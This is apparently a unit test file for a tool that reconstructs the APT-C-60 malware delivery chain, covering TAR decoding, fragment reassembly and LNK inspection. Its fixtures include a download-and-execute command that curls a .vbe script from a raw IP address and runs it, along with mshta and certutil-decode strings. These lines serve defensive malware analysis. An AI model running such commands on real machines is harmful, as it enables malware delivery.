"""Unit tests for APT-C-60 delivery-chain reconstruction."""

from __future__ import annotations

import base64
import io
import tarfile
import unittest

from unpackers.apt_c60_delivery import (
    build_parser,
    decode_base64_tar,
    extract_printable_strings,
    inspect_lnk,
    parse_copy_b_script,
    read_tar_members,
    reconstruct_fragmented_payload,
    safe_member_name,
    sha256_bytes,
)


def fixture_carrier() -> bytes:
    """Build a Base64 TAR with a script and three ordered fragments."""
    stream = io.BytesIO()
    entries = {
        "MsMpEng/msdic.log": b"copy /b TMI003.db + TMI100.db + TMI400.db iconcache.dat\n",
        "MsMpEng/TMI003.db": b"MZ",
        "MsMpEng/TMI100.db": b"A",
        "MsMpEng/TMI400.db": b"B",
    }
    with tarfile.open(fileobj=stream, mode="w") as archive:
        for name, value in entries.items():
            info = tarfile.TarInfo(name)
            info.size = len(value)
            archive.addfile(info, io.BytesIO(value))
    return base64.b64encode(stream.getvalue())


class AptC60DeliveryTests(unittest.TestCase):
    """Exercise safe TAR, script, LNK, and CLI helpers."""

    def test_tar_decode_members_and_reconstruction(self) -> None:
        carrier = fixture_carrier()
        tar_data = decode_base64_tar(carrier)
        members = read_tar_members(tar_data)
        self.assertIn("MsMpEng/msdic.log", members)
        report, payload = reconstruct_fragmented_payload(carrier)
        self.assertEqual(payload, b"MZAB")
        self.assertEqual(report["payload_sha256"], sha256_bytes(payload))

    def test_validation_and_script_parser(self) -> None:
        fragments, output = parse_copy_b_script("copy /b a.db + b.db out.dat\n")
        self.assertEqual(fragments, ["a.db", "b.db"])
        self.assertEqual(output, "out.dat")
        self.assertEqual(safe_member_name("a/b"), "a/b")
        with self.assertRaises(ValueError):
            safe_member_name("../bad")
        with self.assertRaises(ValueError):
            decode_base64_tar(b"not base64!")
        with self.assertRaises(ValueError):
            parse_copy_b_script("echo no")

    def test_string_and_lnk_inspection(self) -> None:
        embedded = '<script src=https://cdn.jsdelivr.net/gh/x/y/help.js></script> mshta certutil -decode'
        data = b"L\0\0\0" + embedded.encode("utf-16le")
        self.assertIn("mshta", "\n".join(extract_printable_strings(data)).lower())
        report = inspect_lnk(data)
        self.assertEqual(report["embedded_script_count"], 1)
        self.assertIn("mshta", report["actions"])
        self.assertTrue(report["urls"])
        self.assertTrue(report["commands"])
        args = build_parser().parse_args(["--input", "x.lnk"])
        self.assertEqual(args.kind, "auto")

    def test_generic_curl_vbe_chain_is_extracted(self) -> None:
        command = (
            r"%windir%\SysWOW64\cmd.exe /c explorer http://103.77.242.187/data.pdf "
            r"& curl http://103.77.242.187/logo.png -o %APPDATA%\bot.vbe "
            r"& %APPDATA%\bot.vbe"
        )
        header = (
            b"L\x00\x00\x00"
            + bytes.fromhex("0114020000000000c000000000000046")
            + b"\x00" * 56
        )
        report = inspect_lnk(header + command.encode("utf-16le"))
        self.assertTrue(report["is_shell_link"])
        self.assertIn("cmd.exe", report["actions"])
        self.assertIn("curl", report["actions"])
        self.assertIn("explorer", report["actions"])
        self.assertIn(".vbe", report["actions"])
        self.assertIn("http://103.77.242.187/logo.png", report["urls"])
        self.assertIn(r"%APPDATA%\bot.vbe", report["output_paths"])
        self.assertTrue(report["commands"])


if __name__ == "__main__":
    unittest.main()
